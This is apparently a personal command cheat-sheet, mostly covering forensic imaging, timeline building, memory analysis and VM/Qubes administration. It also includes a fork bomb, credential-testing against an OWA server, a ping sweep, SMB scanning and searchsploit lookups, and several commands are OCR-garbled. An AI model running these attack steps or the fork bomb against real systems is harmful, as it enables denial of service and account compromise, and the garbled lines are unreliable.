cd floppy$1


##-=====================================-##
##		[+] acquire file E01

yes "" | sudo ewfacquire /dev/fd0 -D floppy$1 -e floppysic -C 1.1 -N floppy$1 -E $1 -D floppy$1 -t floppy$1 -l ~/forensic/floppy$1/logs/ewfacquire$1.txt -m removable -M physical -f encase6 -c deflate -o 0 -B 737280 -S 1.4 -P 512 -g 64 -b 64 -w


##-=====================================-##
##		[+] List files and directories in disk image

fls -r -m "/" -i ewf floppy$1.E01 >> ewf$1.txt


##-=====================================-##
##		[+] Make timeline in csv format

mactime -b ewf$1.txt -d > mactime$1.csv


##-=====================================-##
##		[+] Search file 

fls -r -F floppy2.E01 |grep


##-=====================================-##
##		[+] Take back node 28 

icat floppy2.E01 28 > test22.PAS







ffmpeg -i contaminated.mov -acodec copy -vcodec copy clean.mov

ffmpeg -v info -i stego.mp3 -f null     ## to recode the file and throw away the result



##-=====================================-##
##		[+] Generate a timeline

log2timeline.py --status_view window --hashers MD5 ${TZ} ${DATADIR}/${HOSTNAME}.pb ${MOUNTPOINT}


##-=====================================-##
##		[+] Parse the MFT into a bodyfile format
analyzeMFT.py --bodyfull -b ${DATADIR}/${HOSTNAME}.bodyfile -f ${MOUNTPOINT}/$MFT


##-===========================================-##
##		[+] Read the bodyfile into the existing Plaso file

log2timeline.py ${DATADIR}/${HOSTNAME}.pb ${DATADIR}/${HOSTNAME}.bodyfile


##-=====================================-##
##		[+] Post process the plaso timeline, 
apply various analyses, 
and output to t2tcsv to be fed to logstash

psort.py --tagging-file /usr/share/plaso/tag_windows.txt ${TZ} -o l2tcsv -w ${DATADIR}/${HOSTNAME}.csv ${DATADIR}/${HOSTNAME}.pb


grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" strings.txt





ls -1d /proc/fs/ext*/* /proc/fs/xfs*/* | awk -F/ '{ print $NF }' | while read PART; do
  echo /dev/$PART
done | while read DEV; do
  fls -m/ -r $DEV >> timeline.body
done

log2timeline.py timeline.pb timeline.body

psort.py -o l2tcsv -w timeline.csv timeline.pb



##-=====================================-##
##		[+] Create new profile of Linux for use in Volatility

#
VOLHOME=~/volatility
OSNAME="myos"
 cd $VOLHOME/tools/linux && make
 zip /usr/local/lib/python2.7/dist-packages/volatility/plugins/overlays/$OSNAME.zip \
    /boot/System.map-3.13.0-62-generic $VOLHOME/tools/linux/module.dwarf 




##-===========================================================-##
##		[+] reassembly of packets + splitting in smaller reassembled pcaps.

 tshark -o 'tcp.desegment_tcp_streams:TRUE' -r "$1" -T fields -e tcp.stream | sort -un | tr '\n' ' ' > streams
 rm -rf ${SDIR}; mkdir ${SDIR}
 for x in `cat streams`; do 
    tshark -F pcap -r "$1" -w "${SDIR}/${x}.pcap" tcp.stream eq $x
    echo "Finished stream ${x}"
  done

  
  
  
  
##-=====================================-##
##		[+] use the Sleuthkit to make a timeline

fls –rd / > filedump.txt
mactime –b filedump.txt > filedump_mac.txt

  
VMTYPE=`vmdkinfo $file 2>/dev/null | grep 'Disk type:' | awk -F: '{ print $2 }'`
FILETYPE=`file $file | awk -F: '{ print $2 }' | sed 's?^ ??'`
vhdimount $file $vhdmt
vmdkmount $file $vmdkmt
  
  
mmls -Ma $file | grep 'Linux Logical' | while read FS; do
echo "Found partition of type Linux Logical Volume"
OFFSET=$((`echo $FS | awk '{ print $3 }' | sed 's?^0*??'`*512))
  
mmls -Ma $file | grep 'Linux (' | while read FS; do
echo "Found partition of type Linux Native"
OFFSET=$((`echo $FS | awk '{ print $3 }' | sed 's?^0*??'`*512))
  
echo "Mounting Linux partition $file offset $OFFSET as $mt"
mount -o ro,noload,offset=$OFFSET $file $mt
  
  
mount -t ntfs -o ro,show_sys_files,streams_interface=windows,offset=$OFFSET $file $mt





##-=====================================-##
##		[+] mount a VHD image:

vhdimount image.vhd /mnt/fuse
vhdimount -X allow_root image.vhd /mnt/fuse

mount -o loop,ro,offset=${OFFSET} /mnt/fuse/vhdi1 /mnt/file_system

umount /mnt/fuse
fusermount -u /mnt/fuse




ewfmount 'image location' 'mountpoint'


ewfmount $file $e01mt











vol.py -f memdump.vmem --profile=Win2008R2SP1x64_23418 imagecopy -O memdump.mem


strings -o -el memdump.mem > memdump.txt
strings -o  memdump.mem >> memdump.txt
egrep -iwF 'badguy.net|45.xxx.xxx.xxx' memdump.txt > badguy.txt
less badguy.txt



vol.py -f memdump.mem --profile=Win2008R2SP1x64_23418 yarascan -y /tmp/cobalt.yar

vol.py --plugins=/plugings/cobalt -f memdump.mem --profile=Win2008R2SP1x64_23418 cobaltstrikeconfig -p 5352


python vol.py -f ~/Desktop/win7_trial_64bit.raw imageinfo



ifind -f fat -d 456 fat-img.dd

ifind -f linux-ext2 -n "/etc/" linux-img.dd

ifind -f ntfs -p 5 -l -z EST5EDT ntfs-img.dd
ifind -a					# find all inodes
ifind -d <unit_addr>		# Find the meta data given the data unit
ifind -l					# long format when -p is given
ifind -n <file>				# Find the meta data given the file name
ifind -p <par_addr>			# Find UNALLOCATED MFT entries given the parent's meta address (NTFS only)
ifind -i <imgtype>			# The format of the image file (use '-i list' for supported types)
ifind -b <dev_sector_size>	# The size (in bytes) of the device sectors
ifind -f <fstype>			# File system type (use '-f list' for supported types)
ifind -o <imgoffset>		# The offset of the file system in the image (in sectors)
ifind -v					# Verbose output to stderr
ifind -V					# Print version
ifind -z <ZONE>				# Time zone setting when -l -p is given






blkcat -hw image 264 4
blkcat -a					# displays in all ASCII
blkcat -h					# displays in hexdump-like fashion
blkcat -i <imgtype>			# The format of the image file (use '-i list' for supported types)
blkcat -b <dev_sector_size>	# The size (in bytes) of the device sectors
blkcat -o <imgoffset>		# The offset of the file system in the image (in sectors)
blkcat -f <fstype>			# File system type (use '-f list' for supported types)
blkcat -s					# display basic block stats such as unit size, fragments, etc.
blkcat -v					# verbose output to stderr
blkcat -V					# display version
blkcat -w					# displays in web-like (html) fashion
blkcat -u <usize>			# size of each data unit in image (for raw, blkls, swap)
blkcat <[num]> 				# is the number of data units to display (default is 1)





##-=====================================-##
##		[+] Exposing images works with E01s, VMDKS, RAW, bitlocker, LVM

imount /path/to/VMDK





##-=====================================-##
##		[+] VirtuaBox memory extraction
##		[+] Usage: vboxmemdump.sh <VM name>

VBoxManage debugvm $1 dumpvmcore --filename=$1.elf

size=0x$(objdump -h $1.elf|egrep -w "(Idx|load1)" | tr -s " " |  cut -d " " -f 4)
off=0x$(echo "obase=16;ibase=16;`objdump -h $1.elf|egrep -w "(Idx|load1)" | tr -s " " |  cut -d " " -f 7 | tr /a-z/ /A-Z/`" | bc)
head -c $(($size+$off)) $1.elf|tail -c +$(($off+1)) > $1.raw


##-=====================================-##
##		[+] Get debugfs stat for all inodes

debugfs -R "stat <$line>" "$myrootdrive" | cat >> "$SAVETO/full_inode_extract_output.txt" 



##-=====================================-##
##		[+] Get list of deleted inodes.

get_deleted_files(){

myrootdrive=$(df | awk '{print $1}' | grep /)

debugfs -R "lsdel" "$myrootdrive" | cat > "$SAVETO/deleted_files.txt"






IMG_TYPE=$(img_stat $1 | grep "Image Type:")

xmount --in $ITYPE --out dd ${imm[@]} $MNTPNT


mount -t auto -o ro,loop,noauto,noexec,nodev,noatime,offset=$off,umask=222 $imm $BASE_IMG


icat -f $fs -o $offs $imm $ind > $outputdir/${f##*/}


fsstat -o $offs $imm | grep -ia "File System Type:\|cluster size\|block size\|sector size"


fls -f list


inode=$(ifind -f $fs -o $offs -d $d $imm)


ffind -f $fs -o $offs $imm $ind)
echo "FILE NAME: "$f


blkcat -f $fs -o $offs $imm $d | xxd -l $ss















##-=====================================-##
##		[+] PING SWEEP

for x in {1 .. 254 .. l};do ping -c 1 l.l.l.$x lgrep "64 b" lcut -d" "-f4 ips.txt; done




##-=====================================-##
##		[+] AUTOMATED DOMAIN NAME RESOLVE BASH SCRIPT

#!/bin/bash
echo "Enter Class C Range: i.e. 192.168.3"
read range
for ip in {1 .. 254 .. l};do
host $range.$ip lgrep 11 name pointer 11 lcut -d" " -f5
done



##-=====================================-##
##		[+] FORK BOMB

: (){:I: & I;:



##-=====================================-##
##		[+] DNS REVERSE LOOKUP

for ip in {1 .. 254 .. 1}; do dig -x l.l.l.$ip | grep $ip dns.txt; done;



dig $1 @$DNS_SERVER +tcp | awk '/A.+[0-9]+\.[0-9]+\.[0-9]/{print $5;}'





nslookup -type=srv _ldap._tcp.dc._msdcs.corp.test.com






msfconsole -r file.rc                    ## Load resource file





##-========================================-##
##		[+] Quick Script to Test Domain Credentials 
##		[+] on OWA (Outlook Web Access) Site
##-========================================-##
python testOWA.py -f /tmp/creds.txt -c , -s mail.exchangeserver.com -n 20
 
 
nmap -P0 -n -sS -p445,139 --script=smb-security-mode -iL IPS.txt -oX smb_list.xml




searchsploit -e Windows 7
searchsploit windows 2007 | grep -i local






chip supports virtualization features (vmx)
svm AMD chip supported virtualization
cat /proc/cpuinfo | grep --color -E "vmx|svm|lm"


cp $Image.iso /var/lib/libvirt/images/


start libvirtd.service
enable libvirtd.service




##-====================================================-##
##		[+] Create a directory with restricted chmod file mode bits.
##-====================================================-##

##-=====================================-##
##		[+] Then  a Temp directory using mktemp. 
##-=====================================-##
mkdir --mode=0644 QemuKVM && mktemp --directory QemuKVM/'tmp.XXXXXXXXXX'




qemu-img info $File.img
qemu-img info $Image.qcow2



echo "----Creating QEMU Image----"
qemu-img create -f raw "${IMAGE}" 1G

echo "----Mounting QEMU Image----"
kpartx -a -s -v "${IMAGE}"

echo "----Creating Filesystem----"
mkfs.ext2 "${DEVICE}"

echo "----Making QEMU Image Mountpoint----"
if [ ! -e "${IMAGE_DIR}" ]; then
    mkdir "${IMAGE_DIR}"
    chown "${USER}" "${IMAGE_DIR}"
fi

echo "----Mounting QEMU Image Partition 1----"
mount "${DEVICE}" "${IMAGE_DIR}"

echo "----Unmounting QEMU Image----"
sync
umount "${DEVICE}"
kpartx -d "${IMAGE}"
losetup -d "${DEVICE}" &>/dev/null
dmsetup remove $(basename "$DEVICE") &>/dev/null






##-============================================================================-##
##           [+] KVM/Qemu - Converting Virtual Images Table:
##-============================================================================-##

qemu-img convert -f raw -O qcow2 $Image.img $Image.qcow2        ## Convert [ .raw  -->> .qcow2 ]
qemu-img convert -f vmdk -O raw $Image.vmdk $Image.img          ## Convert [ .vmdk -->>   .raw ]
qemu-img convert -f vmdk -O qcow2 $Image.vmdk $Image.qcow2      ## Convert [ .vmdk -->> .qcow2 ]
qemu-img convert appliance $HD.vmdk -O raw $raw.hdd             ## Convert [ .vmdk -->>   .hdd ]
qemu-img convert $Image.vmdk $Image.bin                         ## Convert [ .vmdk -->>   .bin ]


qemu-img convert $Image.raw -O vmdk $Image.vmdk                 ## Convert [ .raw -->> .vmdk ]
qemu-img convert $Image.dd -O vmdk $Image.vmdk                  ## Convert [  .dd -->> .vmdk ]




## VMDK to Raw Image

#_/\^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/\_____/##-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/\_##
## convert a .raw image -->> .qcow2 image.
qemu-img convert -f raw -O qcow2 $Image.img $Image.qcow2        ## convert a .raw image -->> .qcow2 image.
#_/\^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/\_____/##-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/\_##
## convert a .vmdk image -->> .raw image.
qemu-img convert -f vmdk -O raw $Image.vmdk $Image.img          ## convert a .vmdk image -->> .raw image.
#_/\^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/\_____/##-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/\_##
## convert a ..vmdk image file to a q.cow2 image file.
qemu-img convert -f vmdk -O qcow2 $Image.vmdk $Image.qcow2      ## convert a ..vmdk image file to a q.cow2 image file.
#_/\^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/\_____/##-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/\_##
## convert a .vmdk image -->> .hdd image.
qemu-img convert appliance $HD.vmdk -O raw $raw.hdd             ## convert a .vmdk image -->> .hdd image.
#_/\^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/\_____/##-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/\_##
## Convert a .vmdk -->> .bin file.
qemu-img convert $Image.vmdk $Image.bin                         ## Convert a .vmdk -->> .bin file.
#_/\^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/\_____/##-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^/\_##




## Network Block Device
qemu-nbd --read-only --connect /dev/nbd0 $Image.qcow2
mmls /dev/nbd0
fls /dev/nbd0p1
qemu-nbd --read-only --disconnect /dev/nbd0




##-============================================================-##
##   [+] Create a 10GB QCOW2-image for your virtual machine		## 
##-============================================================-##
qemu-img create -f qcow2 $Image.qcow2 10G


##-========================================================-##
##   [+] test a virtual machine with the hard-drive:
##-========================================================-##
qemu-system-x86_64 -enable-kvm -hda ./disk.qcow2 -m 4096


echo "## ========================================================================= ##"
echo -e "\t\t[+] start a virtual machine with an operating system ISO attached to the virtual CDROM"
echo "## ========================================================================= ##"
qemu-system-x86_64 -enable-kvm -hda ./disk.qcow2 -m 4096 -cdrom ./subgraph-os-alpha_2016-06-16_2.iso -boot d



virt-clone --connect=qemu://example.com/system -o this-vm -n that-vm --auto-clone


qemu-img info "$vmdk_file"
VBoxManage clonehd --format VDI "$vmdk_file" "$vdi_file"
qemu-img info "$vdi_file"
qemu-img info "$image_file"
qemu-img convert -p -O raw "$image_file" "$raw_file"


qemu-img convert -p -O qcow2 -o preallocation=metadata "$Image.img" "$WHONIX_BINARY/$VMNAME-$new.qcow2"


## creates a raw image in the current directory from a VirtualBox VDI image.
VBoxManage clonehd ~/VirtualBox\ VMs/$Image.vdi $Image.img --format raw


VBoxManage showhdinfo $Image.vdi
qemu-nbd -c /dev/nbd0 $Image.vdi

vmdkinfo $Image.vmdk                  ## retrieve information about the assembled image and each of the “Extents”
vmdkmount $Image.vmdk lion            ## Creating a mount point and mounting the image makes it accessible as a raw image file




echo "=============================configure vagrant shared folder============================================================="
vagrant plugin install vagrant-libvirt #The vagrant-libvirt plugin is required when using KVM on Linux
vagrant plugin install vagrant-mutate #Convert vagrant boxes to work with different providers

# https://github.com/chef/bento/tree/master/packer_templates/ubuntu
vagrant box add "bento/ubuntu-19.10" --provider=virtualbox
vagrant mutate "bento/ubuntu-19.10" libvirt

vagrant init --template scripts/Vagrantfile.erb 
vagrant up --provider=libvirt "vg-openvas-01"

vagrant box list #veridy installed boxes
vagrant status #Check the status of the VMs to see that none of them have been created yet
virsh list --all #show all running KVM/libvirt VMs

>vagrant init --template scripts/Vagrantfile.erb
>vagrant up "vg-openvas-01"








Connect to non-default hypervisor:

virsh --connect xen:///
virsh # uri
xen:///



Connect to the QEMU hypervisor over SSH; and the same with logging:

virsh --connect qemu+ssh://username@host/system
LIBVIRT_DEBUG=1 virsh --connect qemu+ssh://username@host/system




Connect a graphic console over SSH:

virt-viewer  --connect qemu+ssh://username@host/system domain
virt-manager --connect qemu+ssh://username@host/system domain






Connect to the VirtualBox hypervisor 
virsh --connect vbox:///system

Network configurations:

virsh -c qemu:///system net-list --all
virsh -c qemu:///system net-dumpxml default



virsh net-list
virsh dumpxml <domain> > domain.xml
virsh create domain.xml
virsh define domain.xml
virsh iface-dumpxml iface > iface.xml
virsh iface-define iface.xml
virsh net-dumpxml --inactive network > network.xml
virsh net-define network.xml

## instructs virsh to additionally display pool persistence and capacity
virsh pool-dumpxml pool > pool.xml
virsh vol-create differentstoragepool newvolume.xml
virsh vol-dumpxml --pool storagepool1 appvolume1 > newvolume.xml
virsh pool-define pool.xml

virsh save-image-dumpxml state-file > state-file.xml
virsh save-image-define state-file state-file-xml


repo --name=fedora --gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-20-primary --ignoregroups=true --mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=fedora-20&arch=$basearch
repo --name=fedora-updates --gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-20-primary --ignoregroups=true --mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=updates-released-f20&arch=$basearch
repo --name=installer --baseurl=file:///tmp/qubes-installer/yum/installer/
repo --name=qubes-dom0 --baseurl=file:///tmp/qubes-installer/yum/qubes-dom0/
repo --name=dom0-updates --baseurl=file:///tmp/qubes-installer/yum/dom0-updates/



qvm-start lab-win7 --cdrom=/usr/lib/qubes/qubes-windows-tools-201211301354.iso

sudo qubes-dom0-update qubes-template-debian-8
sudo qubes-dom0-update anti-evil-maid
sudo qubes-dom0-update --enablerepo=qubes-tempates-community qubes-template-whonix-gw qubes-template-whonix-ws


qvm-create --hvm ubuntu --label red

qvm-start ubuntu --cdrom=work-web:/home/user/Downloads/ubuntu-12.10-desktop-i386.iso	


qvm-open-in-vm
qvm-copy-to-vm


qvm-copy-to-vm personal $GPG.key


qvm-run -q --tray -a my-new-anonvm 'TOR_SKIP_LAUNCH=1 TOR_SKIP_CONTROLPORTTEST=1 TOR_SOCKS_PORT=9050 TOR_SOCKS_HOST=1.2.3.4 ./tor-browser_en-US/Browser/start-tor-browser'


qvm-create -p torvm
qvm-service torvm -d qubes-netwatcher
qvm-service torvm -d qubes-firewall
qvm-service torvm -e qubes-tor

_____________________________________________________
# if you  created a new template in the previous step
qvm-prefs torvm -s template fedora-21-tor

____________________________________________________________
## From your TemplateVM, install the torproject Fedora repo
sudo yum install qubes-tor-repo

________________________________________________________
# Then, in the template, install the TorVM init scripts
sudo yum install qubes-tor

_________________________________________________________________________________
## Configure an AppVM to use TorVM as its NetVM (for example a vm named anon-web)
qvm-prefs -s anon-web sys-net torvm
## ... repeat for any other AppVMs you want torified...

_______________________________________________________________________________________
## Shutdown the TemplateVM.
## Set the prefs of your TorVM to use the default sys-net or sys-firewall as its NetVM
qv
